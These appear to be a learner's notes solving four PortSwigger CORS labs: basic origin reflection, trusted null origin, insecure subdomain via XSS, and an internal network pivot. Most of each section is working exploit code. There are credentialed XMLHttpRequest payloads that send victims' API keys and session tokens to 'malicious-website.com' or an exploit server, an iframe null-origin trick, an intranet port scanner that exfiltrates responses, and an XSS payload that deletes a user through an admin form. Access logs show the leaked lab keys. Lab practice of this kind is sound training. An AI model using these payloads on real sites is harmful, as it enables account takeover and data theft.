# Cross-origin resource sharing (CORS)
https://portswigger.net/web-security/cors

# Same-origin policy (SOP)
https://portswigger.net/web-security/cors/same-origin-policy

# CORS and the Access-Control-Allow-Origin response header
https://portswigger.net/web-security/cors/access-control-allow-origin


hint:
```javascript
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
    location='//malicious-website.com/log?key='+this.responseText;
    };
```

# 1. Lab: CORS vulnerability with basic origin reflection
https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack

To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key. 

```javascript
<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://0aff005f04afdf0cc0551b5f00ea0046.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
    location='/log?key='+this.responseText;
    };
</script>

```
deliver to Victim:
check server for leaked information via response:
    87.71.215.186   2022-08-12 11:58:41 +0000 "GET /deliver-to-victim HTTP/1.1" 302 "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
    10.0.4.223      2022-08-12 11:58:42 +0000 "GET /exploit/ HTTP/1.1" 200 "User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Safari/537.36"
    10.0.4.223      2022-08-12 11:58:42 +0000 "GET /log?key={%20%20%22username%22:%20%22administrator%22,%20%20%22email%22:%20%22%22,%20%20%22apikey%22:%20%22KAwdvlGps26X0quX8F9TqhqAIJYXRdTv%22,%20%20%22sessions%22:%20[%20%20%20%20%229aPfTKXCEuhuiQ9167ChY3mBZpQsMBys%22%20%20]} HTTP/1.1" 200 "User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Safari/537.36"

leaked info:
username :  administrator ,
apikey :  KAwdvlGps26X0quX8F9TqhqAIJYXRdTv ,
sessions : 9aPfTKXCEuhuiQ9167ChY3mBZpQsMBys

# excelent!


hint for WL bypass:
hackersnormal-website.com
normal-website.com.evil-user.net
Origin: null

creating null with snadboxed iframe:

```javascript
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();

function reqListener() {
location='malicious-website.com/log?key='+this.responseText;
};
</script>"></iframe>
```

# 2. Lab: CORS vulnerability with trusted null origin
https://portswigger.net/web-security/cors/lab-null-origin-whitelisted-attack

o solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server

find request for account details to reviels one api:
GET /accountDetails HTTP/1.1




1. craft exploit page:
```javascript
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://0aa000210398a9bfc016255500d30017.web-security-academy.net/accountDetails',true);
req.withCredentials = true;
req.send();

function reqListener() {
location='https://exploit-0a2200a9031da9afc01d252a01560026.web-security-academy.net/exploit/log?key='+this.responseText;
};
</script>"></iframe>
```

2. test on self and check message log: 
```htm
87.71.215.186   2022-08-19 16:41:30 +0000 "GET /exploit/log?key={%20%20%22username%22:%20%22wiener%22,%20%20%22email%22:%20%22%22,%20%20%22apikey%22:%20%2282CKtJ3gszMT4N95PU0T3wRElbwurRs2%22,%20%20%22sessions%22:%20[%20%20%20%20%22SCVzq0Lko9twuOts9QvfEHALhOazrOhE%22%20%20]} HTTP/1.1" 404 "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
```

3. observe in burp request for the the resources that origin header is null:
```htm
    GET /accountDetails HTTP/1.1
    Host: 0aa000210398a9bfc016255500d30017.web-security-academy.net
    Cookie: session=SCVzq0Lko9twuOts9QvfEHALhOazrOhE
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
    Accept: */*
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Origin: null
```



4. send to victim:
```htm
10.0.3.169      2022-08-19 16:42:03 +0000 "GET /exploit/log?key={%20%20%22username%22:%20%22administrator%22,%20%20%22email%22:%20%22%22,%20%20%22apikey%22:%20%22unSfbvBwvXnOqgQSNYO3uDPgghF9uuHo%22,%20%20%22sessions%22:%20[%20%20%20%20%22W41u1Z5gGjxDqvucXLLUn3VmpOootRia%22%20%20]} HTTP/1.1" 404 "User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.101 Safari/537.36"
```

username: administrator | apikey: unSfbvBwvXnOqgQSNYO3uDPgghF9uuHo

# great!



hint (cors via xss):

```htm
https://subdomain.vulnerable-website.com/?xss=<script>cors-stuff-here</script>
```


https://portswigger.net/web-security/cors/lab-breaking-https-attack
# 3. Lab: CORS vulnerability with trusted insecure protocols

To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server.

1. while exloring the site observe stock check redirects to a sub domain: stock.
```htm
GET /?productId=4&storeId=1 HTTP/1.1
Host: stock.0a4900ef046746bcc1e66e39008200a7.web-security-academy.net
..
```

2. check for xss in subdomain:
```htm
GET /?productId=</h4><script>alert()</script>&storeId=1 HTTP/1.1
Host: stock.0a98005704412627c1c734ae007000c7.web-security-academy.net
```
observe pop-up!

3. lets insert a redirection command in the xss-injection point. we will use
window.location.assign()

4. test payload url:
```htm
</h4><script>window.location.assign("https%3a//0a98005704412627c1c734ae007000c7.web-security-academy.net/accountDetails")</script>
```

5. check on self:
```htm
GET /?productId=</h4><script>window.location.assign("https%3a//0a98005704412627c1c734ae007000c7.web-security-academy.net/accountDetails")</script>&storeId=1 HTTP/1.1
Host: stock.0a98005704412627c1c734ae007000c7.web-security-academy.net
```

response:
```htm
TTP/1.1 400 Bad Request
Content-Type: text/html; charset=utf-8
```

and when we use show in browser we see the redirect in action and retrieve information:
```htm
username	"wiener"
email	""
apikey	"p3kajdSY3767fNKqvMd8UfhoaoSugjOv"
sessions	
0	"QAud0U8PAFsU9i9eaQ8GPoe2WnRz1Y6r"
```

6. after we see redirection work lets craft exploit page:
(to see all tries and error see: /home/kali/Documents/Portswigger_labs/CORS/payload4redirection.html)

final script (based on community solution)

```javascript
<script>
    document.location="https://stock.0a6a002003794b5cc0df62bd006b005f.web-security-academy.net/?productId=<script>var xhr = new XMLHttpRequest();xhr.onreadystatechange = function(){if (xhr.readyState == XMLHttpRequest.DONE) {fetch('https://exploit-0aa300e4036e4b1fc09e626901f30003.web-security-academy.net/log?key=' %2b xhr.responseText)};};xhr.open('GET', 'https://0a6a002003794b5cc0df62bd006b005f.web-security-academy.net/accountDetails', true);xhr.withCredentials = true;xhr.send(null);%3c/script>&storeId=1"
</script>
```

check on self - response:
```htm
87.71.215.186   2022-08-20 13:08:08 +0000 "GET /exploit/log?key={%20%20%22username%22:%20%22wiener%22,%20%20%22email%22:%20%22%22,%20%20%22apikey%22:%20%22x30WDbpnleZae8YomjZwNqor9sH9OAAq%22,%20%20%22sessions%22:%20[%20%20%20%20%22thzxzRl5owRod3CGWgztVcVjZJeWSDSs%22%20%20]} HTTP/1.1" 404 "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"

```

send to victim - response:
```htm
10.0.3.75       2022-08-20 13:08:31 +0000 "GET /exploit/log?key={%20%20%22username%22:%20%22administrator%22,%20%20%22email%22:%20%22%22,%20%20%22apikey%22:%20%222vUQ4IQd0gPBX697zSSaEub9b43sFBVc%22,%20%20%22sessions%22:%20[%20%20%20%20%22nozSQVyipNukGtkve539VbQnay327QhK%22%20%20]} HTTP/1.1" 404 "User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.101 Safari/537.36"
```

solution:
2vUQ4IQd0gPBX697zSSaEub9b43sFBVc


# 4. Lab: CORS vulnerability with internal network pivot attack
https://portswigger.net/web-security/cors/lab-internal-network-pivot-attack

This lab requires multiple steps to complete. To solve the lab, craft some JavaScript to locate an endpoint on the local network (192.168.0.0/24, port 8080) that you can then use to identify and create a CORS-based attack to delete a user. The lab is solved when you delete user Carlos. 

pseudo code:
send to victim with access to intranet
scan ip daress for api
exploit fetch intra api to enter admin/delete?username=carlos

1. scan IP adress:
```javascript
<script>
var q = [], collaboratorURL = 'https://exploit-0a21005804569346c1bc01e201df00bd.web-security-academy.net/';

for(i=1;i<=255;i++) {
	q.push(function(url) {
		return function(wait) {
			fetchUrl(url, wait);
		}
	}('http://192.168.0.'+i+':8080'));
}

for(i=1;i<=20;i++){
	if(q.length)q.shift()(i*100);
}

function fetchUrl(url, wait) {
	var controller = new AbortController(), signal = controller.signal;
	fetch(url, {signal}).then(r => r.text().then(text => {
		location = collaboratorURL + '?ip='+url.replace(/^http:\/\//,'')+'&code='+encodeURIComponent(text)+'&'+Date.now();
	}))
	.catch(e => {
		if(q.length) {
			q.shift()(wait);
		}
	});
	setTimeout(x => {
		controller.abort();
		if(q.length) {
			q.shift()(wait);
		}
	}, wait);
}
</script>
```

response:
10.0.4.147      2022-08-20 13:52:55 +0000 "GET /?ip=192.168.0.113:8080&code=%3C!DOCTYPE%20html%3E%0A%3Chtml...
...HTTP/1.1" 200 "User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.101 Safari/537.36"

we have the internal ip adress that returned a reponse with html page:
192.168.0.113:8080

2. scan for XSS vulnarbility

```javascript
<script>
function xss(url, text, vector) {
	location = url + '/login?time='+Date.now()+'&username='+encodeURIComponent(vector)+'&password=test&csrf='+text.match(/csrf" value="([^"]+)"/)[1];
}

function fetchUrl(url, collaboratorURL){
	fetch(url).then(r => r.text().then(text => {
		xss(url, text, '"><img src='+collaboratorURL+'?foundXSS=1>');
	}))
}

fetchUrl("http://192.168.0.113:8080", "https://exploit-0a21005804569346c1bc01e201df00bd.web-security-academy.net/");
</script>

```
access logs:
10.0.4.147      2022-08-20 14:04:05 +0000 "GET /?foundXSS=1 HTTP/1.1" 200 "User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.101 Safari/537.36"

3. get code for page viaaccess log:

<script>
function xss(url, text, vector) {
	location = url + '/login?time='+Date.now()+'&username='+encodeURIComponent(vector)+'&password=test&csrf='+text.match(/csrf" value="([^"]+)"/)[1];
}

function fetchUrl(url, collaboratorURL){
	fetch(url).then(r=>r.text().then(text=>
	{
		xss(url, text, '"><iframe src=/admin onload="new Image().src=\''+collaboratorURL+'?code=\'+encodeURIComponent(this.contentWindow.document.body.innerHTML)">');
	}
	))
}

fetchUrl("http://192.168.0.113:8080", "https://exploit-0a21005804569346c1bc01e201df00bd.web-security-academy.net/");
</script>

access log:
    10.0.4.147      2022-08-20 14:12:32 +0000 "GET /?code=%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cscript%20src%3D%22%2Fresources%2Flabheader%2Fjs%2FlabHeader......0%20%20%20%3C%2Fsection%3E%0A%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%0A%20%20%20%20%0A%0A HTTP/1.1" 200 "User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.101 Safari/537.36"


4.
<script>
function xss(url, text, vector) {
	location = url + '/login?time='+Date.now()+'&username='+encodeURIComponent(vector)+'&password=test&csrf='+text.match(/csrf" value="([^"]+)"/)[1];
}

function fetchUrl(url){
	fetch(url).then(r=>r.text().then(text=>
	{
	xss(url, text, '"><iframe src=/admin onload="var f=this.contentWindow.document.forms[0];if(f.username)f.username.value=\'carlos\',f.submit()">');
	}
	))
}

fetchUrl("http://192.168.0.113:8080");
</script>
